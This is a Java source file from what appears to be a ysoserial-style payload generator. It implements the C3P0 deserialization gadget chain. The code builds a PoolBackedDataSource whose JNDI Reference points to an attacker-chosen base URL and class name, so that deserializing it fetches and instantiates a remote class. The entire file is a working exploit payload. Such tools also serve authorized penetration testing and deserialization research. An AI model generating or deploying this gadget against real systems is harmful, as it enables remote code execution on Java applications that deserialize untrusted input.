package com.h2tg.ysogate.payloads.gadgets;


import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;

import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.PayloadRunner;
import com.h2tg.ysogate.utils.Reflections;
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;


/**
 * com.sun.jndi.rmi.registry.RegistryContext->lookup
 * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
 * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject
 * <p>
 * Arguments:
 * - base_url:classname
 * <p>
 * Yields:
 * - Instantiation of remotely loaded class
 *
 * @author mbechler
 */
@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11"})
@Authors({Authors.MBECHLER})
public class C3P0 implements ObjectPayload<Object>
{

	public Object getObject(String command) throws Exception {
		int sep = command.lastIndexOf(':');
		if (sep < 0) {
			throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
		}

		String url       = command.substring(0, sep);
		String className = command.substring(sep + 1);

		PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
		Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
		return b;
	}


	private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

		private String className;

		private String url;

		public PoolSource(String className, String url) {
			this.className = className;
			this.url = url;
		}

		public Reference getReference() throws NamingException {
			return new Reference("exploit", this.className, this.url);
		}

		public PrintWriter getLogWriter() throws SQLException {
			return null;
		}

		public void setLogWriter(PrintWriter out) throws SQLException {
		}

		public void setLoginTimeout(int seconds) throws SQLException {
		}

		public int getLoginTimeout() throws SQLException {
			return 0;
		}

		public Logger getParentLogger() throws SQLFeatureNotSupportedException {
			return null;
		}

		public PooledConnection getPooledConnection() throws SQLException {
			return null;
		}

		public PooledConnection getPooledConnection(String user, String password) throws SQLException {
			return null;
		}

	}
	public static void main ( final String[] args ) throws Exception {
		PayloadRunner.run(C3P0.class, args);
	}
}
